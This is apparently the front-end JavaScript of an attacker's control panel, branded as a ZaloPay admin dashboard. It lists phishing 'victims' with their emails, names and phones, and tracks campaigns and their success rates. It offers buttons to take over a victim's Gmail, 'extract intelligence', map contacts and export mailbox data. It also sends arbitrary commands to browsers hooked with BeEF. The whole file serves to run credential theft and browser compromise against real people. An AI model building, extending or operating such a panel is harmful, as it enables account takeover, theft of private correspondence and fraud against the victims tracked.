/**
 * ZaloPay Admin Dashboard JavaScript
 * Main functionality for admin interface
 */

class ZaloPayAdmin {
    constructor() {
        this.apiBase = '/api/admin';
        this.wsBase = 'ws://localhost:8000/ws';
        this.ws = null;
        this.currentUser = null;
        this.refreshInterval = null;
        this.init();
    }

    /**
     * Initialize the admin dashboard
     */
    init() {
        this.setupEventListeners();
        this.loadDashboardData();
        this.initializeWebSocket();
        this.startAutoRefresh();
        this.setupDataTables();
        this.setupModals();
        this.setupTooltips();
        this.setupAlerts();
    }

    /**
     * Setup event listeners
     */
    setupEventListeners() {
        // Navigation
        document.querySelectorAll('.nav-link').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                this.handleNavigation(e.target.getAttribute('href'));
            });
        });

        // Buttons
        document.querySelectorAll('.btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                this.handleButtonClick(e.target);
            });
        });

        // Forms
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                this.handleFormSubmit(e);
            });
        });

        // Search inputs
        document.querySelectorAll('.search-input').forEach(input => {
            input.addEventListener('input', (e) => {
                this.handleSearch(e.target);
            });
        });

        // Filter selects
        document.querySelectorAll('.filter-select').forEach(select => {
            select.addEventListener('change', (e) => {
                this.handleFilter(e.target);
            });
        });

        // Refresh buttons
        document.querySelectorAll('.refresh-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                this.refreshCurrentView();
            });
        });

        // Export buttons
        document.querySelectorAll('.export-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                this.handleExport(e.target);
            });
        });

        // Action buttons
        document.querySelectorAll('.action-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                this.handleAction(e.target);
            });
        });
    }

    /**
     * Handle navigation
     */
    handleNavigation(href) {
        if (href.startsWith('#')) {
            const target = document.querySelector(href);
            if (target) {
                target.scrollIntoView({ behavior: 'smooth' });
            }
        } else {
            window.location.href = href;
        }
    }

    /**
     * Handle button clicks
     */
    handleButtonClick(button) {
        const action = button.getAttribute('data-action');
        const target = button.getAttribute('data-target');
        const id = button.getAttribute('data-id');

        switch (action) {
            case 'refresh':
                this.refreshCurrentView();
                break;
            case 'export':
                this.handleExport(button);
                break;
            case 'delete':
                this.handleDelete(id, target);
                break;
            case 'edit':
                this.handleEdit(id, target);
                break;
            case 'view':
                this.handleView(id, target);
                break;
            case 'activate':
                this.handleActivate(id, target);
                break;
            case 'deactivate':
                this.handleDeactivate(id, target);
                break;
            case 'send-command':
                this.handleSendCommand(id);
                break;
            case 'access-gmail':
                this.handleAccessGmail(id);
                break;
            case 'extract-intelligence':
                this.handleExtractIntelligence(id);
                break;
            case 'export-data':
                this.handleExportData(id);
                break;
            default:
                console.log('Unknown action:', action);
        }
    }

    /**
     * Handle form submission
     */
    handleFormSubmit(event) {
        event.preventDefault();
        const form = event.target;
        const formData = new FormData(form);
        const data = Object.fromEntries(formData.entries());

        this.submitForm(form, data);
    }

    /**
     * Handle search input
     */
    handleSearch(input) {
        const query = input.value.toLowerCase();
        const target = input.getAttribute('data-target');
        const table = document.querySelector(target);

        if (table) {
            const rows = table.querySelectorAll('tbody tr');
            rows.forEach(row => {
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(query) ? '' : 'none';
            });
        }
    }

    /**
     * Handle filter selection
     */
    handleFilter(select) {
        const value = select.value;
        const target = select.getAttribute('data-target');
        const table = document.querySelector(target);

        if (table) {
            const rows = table.querySelectorAll('tbody tr');
            rows.forEach(row => {
                const cell = row.querySelector(select.getAttribute('data-column'));
                if (cell) {
                    const cellValue = cell.textContent.trim();
                    row.style.display = (value === 'all' || cellValue === value) ? '' : 'none';
                }
            });
        }
    }

    /**
     * Handle export
     */
    handleExport(button) {
        const format = button.getAttribute('data-format') || 'csv';
        const target = button.getAttribute('data-target');
        const table = document.querySelector(target);

        if (table) {
            this.exportTable(table, format);
        }
    }

    /**
     * Handle delete action
     */
    handleDelete(id, target) {
        if (confirm('Are you sure you want to delete this item?')) {
            this.deleteItem(id, target);
        }
    }

    /**
     * Handle edit action
     */
    handleEdit(id, target) {
        this.loadItemForEdit(id, target);
    }

    /**
     * Handle view action
     */
    handleView(id, target) {
        this.loadItemForView(id, target);
    }

    /**
     * Handle activate action
     */
    handleActivate(id, target) {
        this.updateItemStatus(id, target, 'active');
    }

    /**
     * Handle deactivate action
     */
    handleDeactivate(id, target) {
        this.updateItemStatus(id, target, 'inactive');
    }

    /**
     * Handle send command
     */
    handleSendCommand(id) {
        const command = prompt('Enter command to send:');
        if (command) {
            this.sendBeEFCommand(id, command);
        }
    }

    /**
     * Handle Gmail access
     */
    handleAccessGmail(id) {
        this.accessGmail(id);
    }

    /**
     * Handle extract intelligence
     */
    handleExtractIntelligence(id) {
        this.extractIntelligence(id);
    }

    /**
     * Handle export data
     */
    handleExportData(id) {
        this.exportGmailData(id);
    }

    /**
     * Load dashboard data
     */
    async loadDashboardData() {
        try {
            const response = await fetch(`${this.apiBase}/dashboard/stats`);
            const data = await response.json();

            this.updateDashboardStats(data);
        } catch (error) {
            console.error('Error loading dashboard data:', error);
            this.showAlert('Error loading dashboard data', 'danger');
        }
    }

    /**
     * Update dashboard statistics
     */
    updateDashboardStats(data) {
        // Update victim statistics
        document.querySelector('#total-victims').textContent = data.victims?.total || 0;
        document.querySelector('#active-victims').textContent = data.victims?.active || 0;
        document.querySelector('#new-victims').textContent = data.victims?.new_today || 0;

        // Update campaign statistics
        document.querySelector('#total-campaigns').textContent = data.campaigns?.total || 0;
        document.querySelector('#active-campaigns').textContent = data.campaigns?.active || 0;
        document.querySelector('#success-rate').textContent = `${data.campaigns?.success_rate || 0}%`;

        // Update Gmail statistics
        document.querySelector('#gmail-access').textContent = data.gmail?.total_access || 0;
        document.querySelector('#emails-extracted').textContent = data.gmail?.emails_extracted || 0;
        document.querySelector('#contacts-mapped').textContent = data.gmail?.contacts_mapped || 0;

        // Update BeEF statistics
        document.querySelector('#beef-sessions').textContent = data.beef?.total_sessions || 0;
        document.querySelector('#active-hooks').textContent = data.beef?.active_hooks || 0;
        document.querySelector('#commands-sent').textContent = data.beef?.commands_sent || 0;

        // Update activity logs
        this.updateActivityLogs(data.activity_logs || []);
    }

    /**
     * Update activity logs
     */
    updateActivityLogs(logs) {
        const container = document.querySelector('#activity-logs');
        if (!container) return;

        container.innerHTML = logs.map(log => `
            <div class="activity-item d-flex align-items-center p-3 mb-2">
                <div class="activity-icon bg-${this.getLogColor(log.level)} text-white rounded-circle d-flex align-items-center justify-content-center me-3">
                    <i class="fas fa-${this.getLogIcon(log.level)}"></i>
                </div>
                <div class="flex-grow-1">
                    <div class="fw-bold">${log.message}</div>
                    <small class="text-muted">${this.formatTimestamp(log.timestamp)}</small>
                </div>
                <div class="text-end">
                    <span class="badge bg-${this.getLogColor(log.level)}">${log.level}</span>
                </div>
            </div>
        `).join('');
    }

    /**
     * Get log color
     */
    getLogColor(level) {
        const colors = {
            'info': 'info',
            'warning': 'warning',
            'error': 'danger',
            'success': 'success'
        };
        return colors[level] || 'secondary';
    }

    /**
     * Get log icon
     */
    getLogIcon(level) {
        const icons = {
            'info': 'info-circle',
            'warning': 'exclamation-triangle',
            'error': 'times-circle',
            'success': 'check-circle'
        };
        return icons[level] || 'info-circle';
    }

    /**
     * Initialize WebSocket connection
     */
    initializeWebSocket() {
        try {
            this.ws = new WebSocket(this.wsBase);
            
            this.ws.onopen = () => {
                console.log('WebSocket connected');
                this.showAlert('Real-time updates connected', 'success');
            };

            this.ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                this.handleWebSocketMessage(data);
            };

            this.ws.onclose = () => {
                console.log('WebSocket disconnected');
                this.showAlert('Real-time updates disconnected', 'warning');
                // Reconnect after 5 seconds
                setTimeout(() => this.initializeWebSocket(), 5000);
            };

            this.ws.onerror = (error) => {
                console.error('WebSocket error:', error);
                this.showAlert('Real-time updates error', 'danger');
            };
        } catch (error) {
            console.error('Error initializing WebSocket:', error);
        }
    }

    /**
     * Handle WebSocket messages
     */
    handleWebSocketMessage(data) {
        switch (data.type) {
            case 'victim_update':
                this.updateVictimData(data.payload);
                break;
            case 'campaign_update':
                this.updateCampaignData(data.payload);
                break;
            case 'gmail_update':
                this.updateGmailData(data.payload);
                break;
            case 'beef_update':
                this.updateBeEFData(data.payload);
                break;
            case 'activity_log':
                this.addActivityLog(data.payload);
                break;
            default:
                console.log('Unknown WebSocket message type:', data.type);
        }
    }

    /**
     * Update victim data
     */
    updateVictimData(data) {
        // Update victim statistics
        document.querySelector('#total-victims').textContent = data.total || 0;
        document.querySelector('#active-victims').textContent = data.active || 0;
        document.querySelector('#new-victims').textContent = data.new_today || 0;

        // Update victim table if visible
        if (document.querySelector('#victims-table')) {
            this.loadVictims();
        }
    }

    /**
     * Update campaign data
     */
    updateCampaignData(data) {
        // Update campaign statistics
        document.querySelector('#total-campaigns').textContent = data.total || 0;
        document.querySelector('#active-campaigns').textContent = data.active || 0;
        document.querySelector('#success-rate').textContent = `${data.success_rate || 0}%`;

        // Update campaign table if visible
        if (document.querySelector('#campaigns-table')) {
            this.loadCampaigns();
        }
    }

    /**
     * Update Gmail data
     */
    updateGmailData(data) {
        // Update Gmail statistics
        document.querySelector('#gmail-access').textContent = data.total_access || 0;
        document.querySelector('#emails-extracted').textContent = data.emails_extracted || 0;
        document.querySelector('#contacts-mapped').textContent = data.contacts_mapped || 0;

        // Update Gmail table if visible
        if (document.querySelector('#gmail-table')) {
            this.loadGmailAccess();
        }
    }

    /**
     * Update BeEF data
     */
    updateBeEFData(data) {
        // Update BeEF statistics
        document.querySelector('#beef-sessions').textContent = data.total_sessions || 0;
        document.querySelector('#active-hooks').textContent = data.active_hooks || 0;
        document.querySelector('#commands-sent').textContent = data.commands_sent || 0;

        // Update BeEF table if visible
        if (document.querySelector('#beef-table')) {
            this.loadBeEFSessions();
        }
    }

    /**
     * Add activity log
     */
    addActivityLog(log) {
        const container = document.querySelector('#activity-logs');
        if (!container) return;

        const logElement = document.createElement('div');
        logElement.className = 'activity-item d-flex align-items-center p-3 mb-2 fade-in-up';
        logElement.innerHTML = `
            <div class="activity-icon bg-${this.getLogColor(log.level)} text-white rounded-circle d-flex align-items-center justify-content-center me-3">
                <i class="fas fa-${this.getLogIcon(log.level)}"></i>
            </div>
            <div class="flex-grow-1">
                <div class="fw-bold">${log.message}</div>
                <small class="text-muted">${this.formatTimestamp(log.timestamp)}</small>
            </div>
            <div class="text-end">
                <span class="badge bg-${this.getLogColor(log.level)}">${log.level}</span>
            </div>
        `;

        container.insertBefore(logElement, container.firstChild);

        // Remove old logs if too many
        const logs = container.querySelectorAll('.activity-item');
        if (logs.length > 10) {
            logs[logs.length - 1].remove();
        }
    }

    /**
     * Start auto refresh
     */
    startAutoRefresh() {
        this.refreshInterval = setInterval(() => {
            this.refreshCurrentView();
        }, 30000); // Refresh every 30 seconds
    }

    /**
     * Stop auto refresh
     */
    stopAutoRefresh() {
        if (this.refreshInterval) {
            clearInterval(this.refreshInterval);
            this.refreshInterval = null;
        }
    }

    /**
     * Refresh current view
     */
    refreshCurrentView() {
        const currentPage = window.location.pathname;
        
        if (currentPage.includes('dashboard')) {
            this.loadDashboardData();
        } else if (currentPage.includes('victims')) {
            this.loadVictims();
        } else if (currentPage.includes('campaigns')) {
            this.loadCampaigns();
        } else if (currentPage.includes('gmail')) {
            this.loadGmailAccess();
        } else if (currentPage.includes('beef')) {
            this.loadBeEFSessions();
        }
    }

    /**
     * Load victims data
     */
    async loadVictims() {
        try {
            const response = await fetch(`${this.apiBase}/victims`);
            const data = await response.json();

            this.updateVictimsTable(data);
        } catch (error) {
            console.error('Error loading victims:', error);
            this.showAlert('Error loading victims data', 'danger');
        }
    }

    /**
     * Update victims table
     */
    updateVictimsTable(victims) {
        const tbody = document.querySelector('#victims-table tbody');
        if (!tbody) return;

        tbody.innerHTML = victims.map(victim => `
            <tr>
                <td>${victim.victim_id}</td>
                <td>${victim.email}</td>
                <td>${victim.personal_info?.full_name || 'N/A'}</td>
                <td>${victim.phone || 'N/A'}</td>
                <td>${victim.status}</td>
                <td>${victim.risk_score}</td>
                <td>${this.formatTimestamp(victim.created_at)}</td>
                <td>
                    <div class="btn-group" role="group">
                        <button type="button" class="btn btn-sm btn-outline-primary" data-action="view" data-id="${victim.victim_id}" data-target="victims">
                            <i class="fas fa-eye"></i>
                        </button>
                        <button type="button" class="btn btn-sm btn-outline-success" data-action="access-gmail" data-id="${victim.victim_id}">
                            <i class="fas fa-envelope"></i>
                        </button>
                        <button type="button" class="btn btn-sm btn-outline-warning" data-action="edit" data-id="${victim.victim_id}" data-target="victims">
                            <i class="fas fa-edit"></i>
                        </button>
                        <button type="button" class="btn btn-sm btn-outline-danger" data-action="delete" data-id="${victim.victim_id}" data-target="victims">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                </td>
            </tr>
        `).join('');
    }

    /**
     * Load campaigns data
     */
    async loadCampaigns() {
        try {
            const response = await fetch(`${this.apiBase}/campaigns`);
            const data = await response.json();

            this.updateCampaignsTable(data);
        } catch (error) {
            console.error('Error loading campaigns:', error);
            this.showAlert('Error loading campaigns data', 'danger');
        }
    }

    /**
     * Update campaigns table
     */
    updateCampaignsTable(campaigns) {
        const tbody = document.querySelector('#campaigns-table tbody');
        if (!tbody) return;

        tbody.innerHTML = campaigns.map(campaign => `
            <tr>
                <td>${campaign.campaign_id}</td>
                <td>${campaign.name}</td>
                <td>${campaign.status}</td>
                <td>${campaign.victims_count || 0}</td>
                <td>${campaign.success_rate || 0}%</td>
                <td>${this.formatTimestamp(campaign.created_at)}</td>
                <td>
                    <div class="btn-group" role="group">
                        <button type="button" class="btn btn-sm btn-outline-primary" data-action="view" data-id="${campaign.campaign_id}" data-target="campaigns">
                            <i class="fas fa-eye"></i>
                        </button>
                        <button type="button" class="btn btn-sm btn-outline-success" data-action="activate" data-id="${campaign.campaign_id}" data-target="campaigns">
                            <i class="fas fa-play"></i>
                        </button>
                        <button type="button" class="btn btn-sm btn-outline-warning" data-action="edit" data-id="${campaign.campaign_id}" data-target="campaigns">
                            <i class="fas fa-edit"></i>
                        </button>
                        <button type="button" class="btn btn-sm btn-outline-danger" data-action="delete" data-id="${campaign.campaign_id}" data-target="campaigns">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                </td>
            </tr>
        `).join('');
    }

    /**
     * Load Gmail access data
     */
    async loadGmailAccess() {
        try {
            const response = await fetch(`${this.apiBase}/gmail/access`);
            const data = await response.json();

            this.updateGmailTable(data);
        } catch (error) {
            console.error('Error loading Gmail access:', error);
            this.showAlert('Error loading Gmail access data', 'danger');
        }
    }

    /**
     * Update Gmail table
     */
    updateGmailTable(accessLogs) {
        const tbody = document.querySelector('#gmail-table tbody');
        if (!tbody) return;

        tbody.innerHTML = accessLogs.map(log => `
            <tr>
                <td>${log.victim_id}</td>
                <td>${log.access_session?.status || 'N/A'}</td>
                <td>${log.intelligence_analysis?.emails_extracted || 0}</td>
                <td>${log.intelligence_analysis?.contacts_mapped || 0}</td>
                <td>${this.formatTimestamp(log.created_at)}</td>
                <td>
                    <div class="btn-group" role="group">
                        <button type="button" class="btn btn-sm btn-outline-primary" data-action="view" data-id="${log.victim_id}" data-target="gmail">
                            <i class="fas fa-eye"></i>
                        </button>
                        <button type="button" class="btn btn-sm btn-outline-success" data-action="extract-intelligence" data-id="${log.victim_id}">
                            <i class="fas fa-search"></i>
                        </button>
                        <button type="button" class="btn btn-sm btn-outline-info" data-action="export-data" data-id="${log.victim_id}">
                            <i class="fas fa-download"></i>
                        </button>
                    </div>
                </td>
            </tr>
        `).join('');
    }

    /**
     * Load BeEF sessions data
     */
    async loadBeEFSessions() {
        try {
            const response = await fetch(`${this.apiBase}/beef/hooks`);
            const data = await response.json();

            this.updateBeEFTable(data);
        } catch (error) {
            console.error('Error loading BeEF sessions:', error);
            this.showAlert('Error loading BeEF sessions data', 'danger');
        }
    }

    /**
     * Update BeEF table
     */
    updateBeEFTable(sessions) {
        const tbody = document.querySelector('#beef-table tbody');
        if (!tbody) return;

        tbody.innerHTML = sessions.map(session => `
            <tr>
                <td>${session.victim_id}</td>
                <td>${session.beef_session?.hook_id || 'N/A'}</td>
                <td>${session.beef_session?.status || 'N/A'}</td>
                <td>${session.beef_session?.browser_info?.user_agent || 'N/A'}</td>
                <td>${this.formatTimestamp(session.created_at)}</td>
                <td>
                    <div class="btn-group" role="group">
                        <button type="button" class="btn btn-sm btn-outline-primary" data-action="view" data-id="${session.victim_id}" data-target="beef">
                            <i class="fas fa-eye"></i>
                        </button>
                        <button type="button" class="btn btn-sm btn-outline-success" data-action="send-command" data-id="${session.victim_id}">
                            <i class="fas fa-terminal"></i>
                        </button>
                        <button type="button" class="btn btn-sm btn-outline-info" data-action="view" data-id="${session.victim_id}" data-target="beef">
                            <i class="fas fa-info-circle"></i>
                        </button>
                    </div>
                </td>
            </tr>
        `).join('');
    }

    /**
     * Setup DataTables
     */
    setupDataTables() {
        // Initialize DataTables for all tables
        document.querySelectorAll('table').forEach(table => {
            if (table.id && table.id.includes('table')) {
                $(table).DataTable({
                    responsive: true,
                    pageLength: 25,
                    order: [[0, 'desc']],
                    language: {
                        search: "Search:",
                        lengthMenu: "Show _MENU_ entries",
                        info: "Showing _START_ to _END_ of _TOTAL_ entries",
                        paginate: {
                            first: "First",
                            last: "Last",
                            next: "Next",
                            previous: "Previous"
                        }
                    }
                });
            }
        });
    }

    /**
     * Setup modals
     */
    setupModals() {
        // Initialize all modals
        document.querySelectorAll('.modal').forEach(modal => {
            new bootstrap.Modal(modal);
        });
    }

    /**
     * Setup tooltips
     */
    setupTooltips() {
        // Initialize all tooltips
        document.querySelectorAll('[data-bs-toggle="tooltip"]').forEach(tooltip => {
            new bootstrap.Tooltip(tooltip);
        });
    }

    /**
     * Setup alerts
     */
    setupAlerts() {
        // Auto-hide alerts after 5 seconds
        document.querySelectorAll('.alert').forEach(alert => {
            setTimeout(() => {
                const bsAlert = new bootstrap.Alert(alert);
                bsAlert.close();
            }, 5000);
        });
    }

    /**
     * Show alert
     */
    showAlert(message, type = 'info') {
        const alertContainer = document.querySelector('#alert-container') || document.body;
        
        const alertElement = document.createElement('div');
        alertElement.className = `alert alert-${type} alert-dismissible fade show`;
        alertElement.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;

        alertContainer.insertBefore(alertElement, alertContainer.firstChild);

        // Auto-hide after 5 seconds
        setTimeout(() => {
            const bsAlert = new bootstrap.Alert(alertElement);
            bsAlert.close();
        }, 5000);
    }

    /**
     * Format timestamp
     */
    formatTimestamp(timestamp) {
        if (!timestamp) return 'N/A';
        
        const date = new Date(timestamp);
        return date.toLocaleString();
    }

    /**
     * Export table data
     */
    exportTable(table, format = 'csv') {
        const data = [];
        const headers = [];
        
        // Get headers
        table.querySelectorAll('thead th').forEach(th => {
            headers.push(th.textContent.trim());
        });
        
        // Get data rows
        table.querySelectorAll('tbody tr').forEach(tr => {
            const row = [];
            tr.querySelectorAll('td').forEach(td => {
                row.push(td.textContent.trim());
            });
            data.push(row);
        });
        
        if (format === 'csv') {
            this.exportCSV(headers, data);
        } else if (format === 'json') {
            this.exportJSON(headers, data);
        }
    }

    /**
     * Export CSV
     */
    exportCSV(headers, data) {
        const csvContent = [
            headers.join(','),
            ...data.map(row => row.join(','))
        ].join('\n');
        
        const blob = new Blob([csvContent], { type: 'text/csv' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `export_${new Date().toISOString().split('T')[0]}.csv`;
        a.click();
        window.URL.revokeObjectURL(url);
    }

    /**
     * Export JSON
     */
    exportJSON(headers, data) {
        const jsonData = data.map(row => {
            const obj = {};
            headers.forEach((header, index) => {
                obj[header] = row[index];
            });
            return obj;
        });
        
        const blob = new Blob([JSON.stringify(jsonData, null, 2)], { type: 'application/json' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `export_${new Date().toISOString().split('T')[0]}.json`;
        a.click();
        window.URL.revokeObjectURL(url);
    }

    /**
     * Submit form
     */
    async submitForm(form, data) {
        try {
            const formAction = form.getAttribute('action');
            const method = form.getAttribute('method') || 'POST';
            
            const response = await fetch(formAction, {
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            
            if (response.ok) {
                this.showAlert('Form submitted successfully', 'success');
                form.reset();
            } else {
                throw new Error('Form submission failed');
            }
        } catch (error) {
            console.error('Error submitting form:', error);
            this.showAlert('Error submitting form', 'danger');
        }
    }

    /**
     * Delete item
     */
    async deleteItem(id, target) {
        try {
            const response = await fetch(`${this.apiBase}/${target}/${id}`, {
                method: 'DELETE'
            });
            
            if (response.ok) {
                this.showAlert('Item deleted successfully', 'success');
                this.refreshCurrentView();
            } else {
                throw new Error('Delete failed');
            }
        } catch (error) {
            console.error('Error deleting item:', error);
            this.showAlert('Error deleting item', 'danger');
        }
    }

    /**
     * Update item status
     */
    async updateItemStatus(id, target, status) {
        try {
            const response = await fetch(`${this.apiBase}/${target}/${id}`, {
                method: 'PATCH',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ status: status })
            });
            
            if (response.ok) {
                this.showAlert(`Item ${status} successfully`, 'success');
                this.refreshCurrentView();
            } else {
                throw new Error('Status update failed');
            }
        } catch (error) {
            console.error('Error updating status:', error);
            this.showAlert('Error updating status', 'danger');
        }
    }

    /**
     * Send BeEF command
     */
    async sendBeEFCommand(victimId, command) {
        try {
            const response = await fetch(`${this.apiBase}/beef/command`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    victim_id: victimId,
                    command: command
                })
            });
            
            if (response.ok) {
                this.showAlert('Command sent successfully', 'success');
                this.loadBeEFSessions();
            } else {
                throw new Error('Command failed');
            }
        } catch (error) {
            console.error('Error sending command:', error);
            this.showAlert('Error sending command', 'danger');
        }
    }

    /**
     * Access Gmail
     */
    async accessGmail(victimId) {
        try {
            const response = await fetch(`${this.apiBase}/gmail/access`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    victim_id: victimId
                })
            });
            
            if (response.ok) {
                this.showAlert('Gmail access initiated', 'success');
                this.loadGmailAccess();
            } else {
                throw new Error('Gmail access failed');
            }
        } catch (error) {
            console.error('Error accessing Gmail:', error);
            this.showAlert('Error accessing Gmail', 'danger');
        }
    }

    /**
     * Extract intelligence
     */
    async extractIntelligence(victimId) {
        try {
            const response = await fetch(`${this.apiBase}/gmail/extract`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    victim_id: victimId
                })
            });
            
            if (response.ok) {
                this.showAlert('Intelligence extraction initiated', 'success');
                this.loadGmailAccess();
            } else {
                throw new Error('Intelligence extraction failed');
            }
        } catch (error) {
            console.error('Error extracting intelligence:', error);
            this.showAlert('Error extracting intelligence', 'danger');
        }
    }

    /**
     * Export Gmail data
     */
    async exportGmailData(victimId) {
        try {
            const response = await fetch(`${this.apiBase}/gmail/export`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    victim_id: victimId
                })
            });
            
            if (response.ok) {
                this.showAlert('Gmail data export initiated', 'success');
            } else {
                throw new Error('Gmail data export failed');
            }
        } catch (error) {
            console.error('Error exporting Gmail data:', error);
            this.showAlert('Error exporting Gmail data', 'danger');
        }
    }
}

// Initialize the admin dashboard when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.zaloPayAdmin = new ZaloPayAdmin();
});

// Handle page visibility change
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        window.zaloPayAdmin?.stopAutoRefresh();
    } else {
        window.zaloPayAdmin?.startAutoRefresh();
    }
});

// Handle beforeunload
window.addEventListener('beforeunload', () => {
    window.zaloPayAdmin?.stopAutoRefresh();
    if (window.zaloPayAdmin?.ws) {
        window.zaloPayAdmin.ws.close();
    }
});
